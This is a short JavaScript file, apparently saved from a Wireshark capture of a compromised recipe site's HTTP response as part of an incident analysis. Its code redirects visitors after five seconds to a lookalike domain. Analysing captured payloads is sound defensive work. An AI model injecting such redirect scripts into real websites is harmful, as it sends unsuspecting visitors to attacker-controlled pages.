// malicious.js
// Извлечено из HTTP-ответа yummyrecipesforme.com
// Wireshark → Follow → HTTP stream → Save as...

setTimeout(function(){
    location.href = "http://greatrecipesforme.com/";
}, 5000);
